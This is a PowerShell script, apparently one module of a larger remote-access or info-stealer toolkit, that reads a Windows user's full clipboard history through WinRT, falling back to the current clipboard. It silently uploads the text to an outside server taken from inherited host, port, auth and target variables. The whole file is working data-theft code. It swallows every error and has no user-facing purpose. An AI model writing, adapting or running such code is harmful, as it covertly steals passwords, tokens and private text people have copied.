# clipboard.ps1 - inherits $H, $P, $AU, $TH from init.ps1

$out = [System.Text.StringBuilder]::new()

# ── Check if clipboard history is enabled ────────────────
$histEnabled = $false
try {
    $reg = Get-ItemProperty "HKCU:\Software\Microsoft\Clipboard" -ErrorAction Stop
    $histEnabled = $reg.EnableClipboardHistory -eq 1
} catch {}

$out.AppendLine("history enabled : $histEnabled") | Out-Null
$out.AppendLine("captured        : $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')") | Out-Null

# ── Try to get full clipboard history via WinRT ──────────
if ($histEnabled) {
    try {
        Add-Type -AssemblyName System.Runtime.WindowsRuntime

        $null = [Windows.ApplicationModel.DataTransfer.Clipboard,
                 Windows.ApplicationModel.DataTransfer,
                 ContentType=WindowsRuntime]

        # helper to convert WinRT IAsyncOperation to .NET Task
        function AwaitTask($async, $type) {
            $m = [System.WindowsRuntimeSystemExtensions].GetMethods() |
                 Where-Object { $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 } |
                 Select-Object -First 1
            $task = $m.MakeGenericMethod($type).Invoke($null, @($async))
            $task.Wait() | Out-Null
            $task.Result
        }

        $result = AwaitTask (
            [Windows.ApplicationModel.DataTransfer.Clipboard]::GetHistoryItemsAsync()
        ) ([Windows.ApplicationModel.DataTransfer.ClipboardHistoryItemsResult])

        $items = $result.Items
        $out.AppendLine("items found     : $($items.Count)") | Out-Null
        $out.AppendLine("") | Out-Null

        $i = 1
        foreach ($item in $items) {
            $out.AppendLine("── Item $i ─────────────────────────────") | Out-Null
            $content = $item.Content
            $formats = $content.AvailableFormats -join ", "
            $out.AppendLine("formats : $formats") | Out-Null

            $textFmt = [Windows.ApplicationModel.DataTransfer.StandardDataFormats]::Text
            if ($content.Contains($textFmt)) {
                $text = AwaitTask ($content.GetTextAsync()) ([string])
                $out.AppendLine("text    :") | Out-Null
                $out.AppendLine($text) | Out-Null
            } else {
                $out.AppendLine("text    : (non-text item)") | Out-Null
            }
            $i++
        }
    } catch {
        $out.AppendLine("") | Out-Null
        $out.AppendLine("[WinRT history failed, falling back to current clipboard]") | Out-Null
        $out.AppendLine((Get-Clipboard -Raw 2>$null)) | Out-Null
    }
} else {
    # history not enabled — just grab current clipboard
    $out.AppendLine("") | Out-Null
    $out.AppendLine("[CURRENT CLIPBOARD ONLY]") | Out-Null
    $text = Get-Clipboard -Raw 2>$null
    if ($text) {
        $out.AppendLine($text) | Out-Null
    } else {
        $out.AppendLine("(empty)") | Out-Null
    }
}

$wc = New-Object Net.WebClient
$wc.Headers.Add("Authorization", $AU)
$wc.Headers.Add("Content-Type", "text/plain")
$wc.Headers.Add("X-Target", $TH)
try { $wc.UploadString("https://${H}:${P}/store/clipboard", $out.ToString()) } catch {}
